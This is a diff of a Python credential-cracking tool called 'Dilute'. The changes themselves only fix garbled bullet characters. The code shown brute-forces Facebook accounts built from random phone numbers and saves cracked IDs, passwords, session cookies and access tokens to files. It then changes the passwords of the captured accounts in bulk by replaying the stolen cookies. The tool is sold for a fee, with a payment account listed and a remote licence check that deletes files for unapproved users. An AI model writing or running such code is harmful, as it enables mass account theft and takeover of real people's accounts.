@@ -23,7 +23,7 @@ elif "arm" in str(find_aarch):
 	user_aarch = "32"
 	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config32.zip"
 else:
-	print(" [â€¢] Your Device aarch Unknown ")
+	print(" [•] Your Device aarch Unknown ")
 
 
 try:
@@ -33,7 +33,7 @@ try:
 except Exception as e:
 	print(e)
 except ConnectionError:
-	print(" [â€¢] Please Check Your Internet ")
+	print(" [•] Please Check Your Internet ")
 '''
 
 try:
@@ -122,27 +122,27 @@ def connection_token():
 
 def update():
 	logo()
-	print(' [â€¢] Checking Updates from Our Server ....')
+	print(' [•] Checking Updates from Our Server ....')
 	line()
 	try:
 		server = pars(requests.get('https://dilutecodes.blogspot.com/2023/05/iamabestserver.html?m=1',verify=True).text,'html.parser')
 	except CE:
-		print(" [â€¢] Check Your Internet")
+		print(" [•] Check Your Internet")
 	for x in server.find_all('div',class_='post-body entry-content float-container'):
 		r = x.text
 
 	if '2.0.1' in r:
-		print(' [â€¢] Server is Online Welcome Users ..')
+		print(' [•] Server is Online Welcome Users ..')
 		sp(1)
-		print(" [â€¢] Tool is Updated On 24/5/2023")
-		print(" [â€¢] Checking Subscription ")
+		print(" [•] Tool is Updated On 24/5/2023")
+		print(" [•] Checking Subscription ")
 		iAmApprovelSystem()
 	elif "off" in r:
-		print(' [â€¢] Server is Offline For Some Reasons ..')
+		print(' [•] Server is Offline For Some Reasons ..')
 		exit()
 	else:
-		print(' [â€¢] A new Version of this Dilute Tool is Available | Please Wait ....')
-		print(" [â€¢] Updating Tool ....")
+		print(' [•] A new Version of this Dilute Tool is Available | Please Wait ....')
+		print(" [•] Updating Tool ....")
 		line()
 		sp(1)
 		
@@ -152,17 +152,17 @@ def iAmApprovelSystem():
 	try:
 		r = pars(requests.get("https://aqibservers.blogspot.com/2023/05/iamjohnnysins.html?m=1",verify=True).text,'html.parser')
 	except CE:
-		print(" [â€¢] Check Your Internet Connection ...")
+		print(" [•] Check Your Internet Connection ...")
 	except Exception as e:
 		print(e)
 	for x in r.find_all('div',class_="post-body entry-content float-container"):
 		server_keys = x.text
 	if 'free' in str(server_keys):
-		print(" [â€¢] Tool is on Free Trial Enjoy")
+		print(" [•] Tool is on Free Trial Enjoy")
 		sp(2)
 		iAmMain().iAmMenu()
 	elif 'update' in str(server_keys):
-		print(" [â€¢] Tool is Under Maintenence ")
+		print(" [•] Tool is Under Maintenence ")
 		exit()
 	elif str(bumper) in server_keys:
 		if str(bumper)+'|ok' in server_keys:
@@ -174,7 +174,7 @@ def iAmApprovelSystem():
 	elif str(bumper) in server_keys:
 		if str(bumper)+'|fuck' in server_keys:
 			status = 'fuck'
-			print(" [â€¢] You Dont Have Permission To use this Tool ..")
+			print(" [•] You Dont Have Permission To use this Tool ..")
 			os.system("rm -rf d64 d32 SKB")
 			exit()
 	elif str(key) in server_keys:
@@ -186,20 +186,20 @@ def iAmApprovelSystem():
 def buy():
 	logo()
 	line()
-	print(" [â€¢] Terms and Conditions Please Read Carefully ")
-	print(" [â€¢] Your Token is Not Approved ")
-	print(" [â€¢] This Tool is paid you need to buy first before Use ! ")
-	print(" [â€¢] 1 token is only for 1 device you can't use your subscription in more than 1 device")
-	print(" [â€¢] please do agree terms and conditions then buy")
+	print(" [•] Terms and Conditions Please Read Carefully ")
+	print(" [•] Your Token is Not Approved ")
+	print(" [•] This Tool is paid you need to buy first before Use ! ")
+	print(" [•] 1 token is only for 1 device you can't use your subscription in more than 1 device")
+	print(" [•] please do agree terms and conditions then buy")
 	line()
-	print(' [â€¢] If Facebook go on update and you dont get any accounts its your headache ')
-	print(' [â€¢] Apni zimaydari pe buy kren,me koi b zimaydari n leta illegal atctivity k')
-	print(" [â€¢] 300 / 1Month , 250 / 15 Days ")
-	print(" [â€¢] Payment : JazzCash/Easypaisa")
-	print(' [â€¢] Account Num : 03152056613 ')
-	print(" [â€¢] Token : %s"%(bumper))
-	print(" [â€¢] Copy & send Token to Admun to get approved ")
-	print(" [â€¢] Koi mera dost ho ya kuch b ho ab free approvel me kise ko nhi donga ids ay ya nah ay apni zimaydari pe buy kro ")
+	print(' [•] If Facebook go on update and you dont get any accounts its your headache ')
+	print(' [•] Apni zimaydari pe buy kren,me koi b zimaydari n leta illegal atctivity k')
+	print(" [•] 300 / 1Month , 250 / 15 Days ")
+	print(" [•] Payment : JazzCash/Easypaisa")
+	print(' [•] Account Num : 03152056613 ')
+	print(" [•] Token : %s"%(bumper))
+	print(" [•] Copy & send Token to Admun to get approved ")
+	print(" [•] Koi mera dost ho ya kuch b ho ab free approvel me kise ko nhi donga ids ay ya nah ay apni zimaydari pe buy kro ")
 	line()
 	exit()
 
@@ -230,14 +230,14 @@ class iAmMain:
 		p(" [4] Pass changer ")
 		p(" [E] Exit Tool ")
 		line()
-		opt1 = input(" [â€¢] Select An Option : ")
+		opt1 = input(" [•] Select An Option : ")
 		if opt1 == "1":self.file_menu()
 		
 		elif opt1 == "2":self.num_menu()
 		elif opt1 == "4":automation().menu()
 		elif opt1 == "3":Grep().links_only()
-		elif opt1 == "E":exit(" [â€¢] KATM.TATA BY BY")
-		else:p(" [â€¢] Wrong Select ");sp(2);self.iAmMenu()
+		elif opt1 == "E":exit(" [•] KATM.TATA BY BY")
+		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
 	
 	
 	def dump_menu(self):
@@ -245,20 +245,20 @@ class iAmMain:
 		
 	def file_menu(self):
 		logo()
-		p(" [â€¢] Example /sdcard/filename.txt")
-		file = input(" [â€¢] Put File Path : ")
+		p(" [•] Example /sdcard/filename.txt")
+		file = input(" [•] Put File Path : ")
 		try:
 			id = open(file,"r").read().splitlines()
 			self.method_select(id)
 		except FileNotFoundError:
-			p(" [â€¢] File Path Incorrect ")
+			p(" [•] File Path Incorrect ")
 			sp(2);self.file_menu()
 		
 	def method_select(self,id):
 		logo()
 		p(" [3] Method 3 [BEST] ")
 		line()
-		m_opt = input(" [â€¢] Choose : ")
+		m_opt = input(" [•] Choose : ")
 		if m_opt =='1':
 			method.append("i")
 			self.password_menu(id)
@@ -271,26 +271,26 @@ class iAmMain:
 		elif m_opt =="4":
 			 method.append('iiii')
 			 self.password_menu(id)
-		else:p(" [â€¢] Wrong Select ! ");sp(2);self.method_select(id)
+		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)
 
 	def password_menu(self,id):
 		pwx=[]
 		logo()
 		max = 20
-		p(" [â€¢] Example 1 , 2 , 3  to 20 Max ")
+		p(" [•] Example 1 , 2 , 3  to 20 Max ")
 		try:
-			plimit = int(input(" [â€¢] Put limit : "))
+			plimit = int(input(" [•] Put limit : "))
 			if plimit =="":
 				plimit = 4
 			elif plimit > max:
-				p(" [â€¢] Password Limit Should undet 20 ");sp(2);self.password_menu()
+				p(" [•] Password Limit Should undet 20 ");sp(2);self.password_menu()
 		except:
 			plimit = 4
 		logo()
-		p(" [â€¢] Enter Your Passwords like : first last First Last etc ")
+		p(" [•] Enter Your Passwords like : first last First Last etc ")
 		line()
 		for n in range(plimit):
-			pwx.append(input(" [â€¢] Put Password %s : "%(n+1)))
+			pwx.append(input(" [•] Put Password %s : "%(n+1)))
 		logo()
 		p("  Total File Accounts : %s "%(str(len(id))))
 		p(" Proces has been started ")
@@ -310,31 +310,31 @@ class iAmMain:
 		self.saved_results(ok,cp)
 	def saved_results(self,ok,cp):
 		line()
-		p(" [â€¢] Cloning Hasbeen Completed ")
-		p(" [â€¢] Cloning Accounts Saved in /sdcard")
-		p(" [â€¢] Total Ok Accounts : %s "%(len(ok)))
-		p(" [â€¢] Total Cp Accounts : %s "%(len(cp)))
+		p(" [•] Cloning Hasbeen Completed ")
+		p(" [•] Cloning Accounts Saved in /sdcard")
+		p(" [•] Total Ok Accounts : %s "%(len(ok)))
+		p(" [•] Total Cp Accounts : %s "%(len(cp)))
 		line()
-		input(" [â€¢] Press Enter To Go Back ")
+		input(" [•] Press Enter To Go Back ")
 		self.iAmMenu()
 
 	def num_menu(self):
 		logo()
 		pwx=[]
-		p(" [â€¢] Advanced Random Cloning Tool ")
+		p(" [•] Advanced Random Cloning Tool ")
 		line()
-		p(" [â€¢] Example : 0300 , 0313 , 0324 , 0342 ")
+		p(" [•] Example : 0300 , 0313 , 0324 , 0342 ")
 		line()
-		code = input(" [â€¢] Put Sim Code : ")
+		code = input(" [•] Put Sim Code : ")
 		logo()
-		p(" [â€¢] Example : 1000, 2000 , 5000 Max ")
+		p(" [•] Example : 1000, 2000 , 5000 Max ")
 		max = 5000
 		try:
-			clone_limit = int(input(" [â€¢] Put Clone Limit : "))
+			clone_limit = int(input(" [•] Put Clone Limit : "))
 			if clone_limit =="":
 				clone_limit = 1000
 			elif clone_limit > max:
-				p(" [â€¢] Limit Should be Under 5000 ");sp(2);self.num_menu()
+				p(" [•] Limit Should be Under 5000 ");sp(2);self.num_menu()
 		except:
 			clone_limit = 1000
 		for n in range(clone_limit):
@@ -344,28 +344,28 @@ class iAmMain:
 		p(" [1] Auto Password \n [2] Choice Password ")
 		line()
 		pwx_=[]
-		pw_select = input(" [â€¢] Choose : ")
+		pw_select = input(" [•] Choose : ")
 		if pw_select == "1":
 			pwx_.append("i")
 		elif pw_select == "2":
 			pwx_.append('ii')
 			max = 10
 			try:
-				p_limit = int(input(" [â€¢] Put Password Limit : "))
+				p_limit = int(input(" [•] Put Password Limit : "))
 				if p_limit =="":
 					p_limit = 5
 				elif p_limit > max:
-					p(" [â€¢] Limit Should be Under 1 - 10 ");sp(2);num_menu()
+					p(" [•] Limit Should be Under 1 - 10 ");sp(2);num_menu()
 			except:
 				p_limit = 5
 			for n in range(p_limit):
-				pwx.append(input(" [â€¢] Put Password %s : "%(n+1)))
+				pwx.append(input(" [•] Put Password %s : "%(n+1)))
 		else:
 			pwx_.append("i")
 		logo()
 		
-		p(" [â€¢] Total Random Accounts : %s "%(str(len(id))))
-		p(" [â€¢] Dilute Brute Has Been Started ")
+		p(" [•] Total Random Accounts : %s "%(str(len(id))))
+		p(" [•] Dilute Brute Has Been Started ")
 		line()
 		with tpe(max_workers=30) as saqi:
 			for user in id:
@@ -508,7 +508,7 @@ class iAmMain:
 					token = q["access_token"]
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
 					p('\r\033[1;92m[KANO-OK] %s | %s \033[1;97m '%(uid,pw))
-					p(f" [â€¢]\033[1;96m Cookie : {cok}\033[1;97m")
+					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
 					ok.append(uid)
 					open('/sdcard/KANO_M2_OK.txt','a').write(uid+'|'+pw+'\n')
 					open('/sdcard/KANO_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
@@ -747,7 +747,7 @@ class Grep:
 			os.system('touch '+out)
 			os.system('sort -r '+file+' | uniq > '+out)
 			p("  [ All double links are Removed ] ")
-			p(" [â€¢] Your File Saved in %s "%(out))
+			p(" [•] Your File Saved in %s "%(out))
 			input("  [ Press Enter To Go Back ] ")
 			time.sleep(1)
 			self.remove_links()
@@ -759,14 +759,14 @@ class Grep:
 		os.system("rm -rf .tmp.txt")
 		try:
 			p(" [  Example  :-  /sdcard/file.txt  ] ")
-			file = input(" [â€¢|â€¢] Enter File Path :- ")
+			file = input(" [•|•] Enter File Path :- ")
 			line()
 			p("	Example  :-  /sdcard/file1.txt  ")
 			sav = input(" [] Enter Save Path :- ")
 			line()
-			p(" [â€¢]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
+			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
 			try:
-				limit = int(input(" [â€¢|â€¢] how many links you wants to grep :- "))
+				limit = int(input(" [•|•] how many links you wants to grep :- "))
 				line()
 			except:
 				limit = 1
@@ -779,7 +779,7 @@ class Grep:
 			p("	  Example  :-  100089,88,87 etc")
 			for n in range(limit):
 				print(open(".tmp.txt","r").read().splitlines())
-				digit = int(input(" [â€¢|â€¢] Enter Digit %s :- "%(n+1)))
+				digit = int(input(" [•|•] Enter Digit %s :- "%(n+1)))
 				line()
 				os.system('cat .tmp.txt | grep '+str(digit)+' >>'+sav+' ')
 				p(" [	Your File Saved in :- %s ]  "%(sav))
@@ -809,7 +809,7 @@ class Grep:
 			p("	Example  :-	100089 , 100088 etx  ")
 			for n in range(limit):
 				line()
-				digit = int(input(" [â€¢|â€¢] Put Digits %s :- "%(n+1)))
+				digit = int(input(" [•|•] Put Digits %s :- "%(n+1)))
 				os.system('cat '+file+' | grep '+str(digit)+' >>'+ofile+' ')
 				p(" [	Your File Saved in :- %s ]  "%(ofile))
 				input(" [ Press Enter To go Back ] ")
@@ -822,13 +822,13 @@ class Grep:
 class Server:
 	def report(self):
 		logo()
-		print(" [â€¢] Ex Cp issues/New updates Etc ")
-		print(' [â€¢] Please Describe issues in details\n [â€¢] It will be send to Admin ')
+		print(" [•] Ex Cp issues/New updates Etc ")
+		print(' [•] Please Describe issues in details\n [•] It will be send to Admin ')
 		line()
-		issue = input(' [â€¢] Describe your Problem : ')
-		name = input(' [â€¢] Enter Your Name :- ')
-		email = input(' [â€¢] Enter Your Email/Contact/Fb Link : ')
-		print(' [â€¢] Sending Your Appeal .....')
+		issue = input(' [•] Describe your Problem : ')
+		name = input(' [•] Enter Your Name :- ')
+		email = input(' [•] Enter Your Email/Contact/Fb Link : ')
+		print(' [•] Sending Your Appeal .....')
 		form = f'	__________________\n	Full Name : {name} \n	Email  : {email} \n	Issues : {issue} '
 		TEXT = form
 		SUBJECT = " Dilute Codes Users Feedback"
@@ -842,7 +842,7 @@ class Server:
 		server.starttls()
 		server.login(username, password)
 		server.sendmail(se, rse, message)
-		print(" [â€¢] Your Appleal Has been Submitted ")
+		print(" [•] Your Appleal Has been Submitted ")
 		print(form)
 		exit()
 
@@ -855,35 +855,35 @@ class automation:
 		
 		p(" [1] Facebook Password Change Menu ")
 		p(' [2] Cut Used File lines ')
-		am = input(" [â€¢] Select an option : ")
+		am = input(" [•] Select an option : ")
 		if am == "1":self.iAmPasswordManager()
 		elif am == "2":self.used_cutter()
 		else:
-			p(" [â€¢] wrong select!! ");sp(2);self.menu()
+			p(" [•] wrong select!! ");sp(2);self.menu()
 	def used_cutter(self):
 		clear()
 		logo()
 		lines=[]
-		p(" [â€¢] Ex : /sdcard/file.txt")
+		p(" [•] Ex : /sdcard/file.txt")
 		try:
-			file = input(" [â€¢] Put File Path : ")
+			file = input(" [•] Put File Path : ")
 		except Exception as e:
-			print(" [â€¢] File Path Incorrect!! ");sp(2);self.used_cutter()
-		digit= int(input(" [â€¢] Put Line Num :"))
+			print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
+		digit= int(input(" [•] Put Line Num :"))
 		with open(file,"r") as r:
 			lines = r.readlines()
 		with open(file,"w") as w:
 			for num,line in enumerate(lines):
 				if num >= digit:
 					w.write(line)
-		p(" [â€¢] File Splitted Complete")
+		p(" [•] File Splitted Complete")
 	def iAmPasswordManager(self):
 		logo()
-		p(" [â€¢] Password Changer By : KANO")
+		p(" [•] Password Changer By : KANO")
 		line()
 		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
 		line()
-		iamoption = input(' [â€¢] Choose : ')
+		iamoption = input(' [•] Choose : ')
 		if iamoption == '1':
 			self.bulk_password()
 		elif iamoption =='2':
@@ -893,7 +893,7 @@ class automation:
 		elif iamoption =='B':
 			iAmApprovelSystem()
 		else:
-			p(" [â€¢] Wrong Select ! ")
+			p(" [•] Wrong Select ! ")
 			sp(2);self.iAmPasswordManager()
 	
 	def bulk_password(self):
@@ -903,24 +903,24 @@ class automation:
 		except FileNotFoundError:
 			iamdefaultpassword = "KANO@@@"
 		logo()
-		p(" [â€¢] Password Changer By : KANO")
+		p(" [•] Password Changer By : KANO")
 		line()
-		print(" [â€¢] Default Password : %s "%(iamdefaultpassword))
+		print(" [•] Default Password : %s "%(iamdefaultpassword))
 		line()
 		np = iamdefaultpassword
 		try:
-			file = input(" [â€¢] Put File Path : ")
+			file = input(" [•] Put File Path : ")
 			id = open(file,"r").read().splitlines()
 		except FileNotFoundError:
-			print(" [â€¢] File Not Found ! ")
+			print(" [•] File Not Found ! ")
 			sp(2)
 			self.bulk_password()
 		logo()
-		print(" [â€¢] Password Changing Procces is started ! ")
+		print(" [•] Password Changing Procces is started ! ")
 		line()
-		p(" [â€¢] Total File Accounts : %s "%(len(id)))
+		p(" [•] Total File Accounts : %s "%(len(id)))
 		line()
-		p(" [â€¢] Please Be Patience Use Fast Internet ")
+		p(" [•] Please Be Patience Use Fast Internet ")
 		line()
 		for x in id:
 			uid = x.split("|")[0]
@@ -931,7 +931,7 @@ class automation:
 			try:
 				r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
 			except CE:
-				p(" [â€¢] Check Your Internet")
+				p(" [•] Check Your Internet")
 			except Exception as e:
 				print(e)
 			if "/zero/optin/write/?" in r:
@@ -940,7 +940,7 @@ class automation:
 				r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
 				r= r.replace("amp;","")
 			except CE:
-				print(" [â€¢] Check Your Internet Unexpected Stopped ! ")
+				print(" [•] Check Your Internet Unexpected Stopped ! ")
 				exit()
 			
 			next = re.findall('action\="(.*?)"',r)[1]
@@ -956,15 +956,15 @@ class automation:
 			po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
 			po = po.replace("amp;","")
 			if 'Password changed' in po:
-				p(" [â€¢]  \033[1;92m Password Changed Succesfully : \033[1;97m%s "%(uid))
+				p(" [•]  \033[1;92m Password Changed Succesfully : \033[1;97m%s "%(uid))
 				open(sav,"a").write(uid+'|'+np+'\n')
 			else:
-				p(" [â€¢]\033[1;91m Failed To Changed Password : \033[1;97m%s "%(uid))
+				p(" [•]\033[1;91m Failed To Changed Password : \033[1;97m%s "%(uid))
 		line()
-		print(" [â€¢] Proccess Has Been Completed ! ")
-		print(" [â€¢] Your File Saved in %s "%(sav))
+		print(" [•] Proccess Has Been Completed ! ")
+		print(" [•] Your File Saved in %s "%(sav))
 		line()
-		input(" [â€¢] Press Enter To Go Back to Password Menu ! ")
+		input(" [•] Press Enter To Go Back to Password Menu ! ")
 		sp(1)
 		self.iAmPasswordManager()
 		
@@ -975,18 +975,18 @@ class automation:
 		except FileNotFoundError:
 			iamdefaultpassword = "KANO"
 		logo()
-		p(" [â€¢] Password Changer By : KANO ")
+		p(" [•] Password Changer By : KANO ")
 		line()
-		print(" [â€¢] Default Password : %s "%(iamdefaultpassword))
+		print(" [•] Default Password : %s "%(iamdefaultpassword))
 		line()
 		np = iamdefaultpassword
-		pw = input(" [â€¢] Put Old Pass : ")
-		cok = input(" [â€¢] Paste Cookies : ")
+		pw = input(" [•] Put Old Pass : ")
+		cok = input(" [•] Paste Cookies : ")
 		cookies = {'cookie':cok}
 		try:
 			r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
 		except CE:
-			p(" [â€¢] Check Your Internet")
+			p(" [•] Check Your Internet")
 		except Exception as e:
 			print(e)
 		if "/zero/optin/write/?" in r:
@@ -1007,13 +1007,13 @@ class automation:
 		
 		po = po.replace("amp;","")
 		if 'Password changed' in po:
-			p(" [â€¢]   Password Changed Succesfully ")
+			p(" [•]   Password Changed Succesfully ")
 			
 			sp(2)
-			input(" [â€¢] Press Enter To Go Backk")
+			input(" [•] Press Enter To Go Backk")
 			self.iAmPasswordManager()
 		else:
-			p(" [â€¢] Failed To Changed Password ")
+			p(" [•] Failed To Changed Password ")
 	def iAmFreeMode(self,cookies,r):
 		for x in re.findall('action\=\"(.*?)"',r):
 			if "/zero/optin/write/?" in x:
@@ -1037,20 +1037,20 @@ class automation:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
 			iamdefaultpassword = "KANO786"
-		p(" [â€¢] Default Password : %s"%(iamdefaultpassword))
+		p(" [•] Default Password : %s"%(iamdefaultpassword))
 		line()
 		os.system("rm -rf .default_password.txt ")
-		change_pw = input(" [â€¢] Put New Default Password : ")
+		change_pw = input(" [•] Put New Default Password : ")
 		if len(change_pw) < 6:
-			print(" [â€¢] Password Should be Six Characters More .")
+			print(" [•] Password Should be Six Characters More .")
 			sp(2)
 			self.change_default()
 		
 		t = open(".default_password.txt","w").write(change_pw)
-		print(" [â€¢] Default Password is Changed ! ")
-		p(" [â€¢] Your New Password : %s "%(change_pw))
+		print(" [•] Default Password is Changed ! ")
+		p(" [•] Your New Password : %s "%(change_pw))
 		line()
-		input("[â€¢] Press Enter to go back ")
+		input("[•] Press Enter to go back ")
 
 		self.iAmPasswordManager()
 
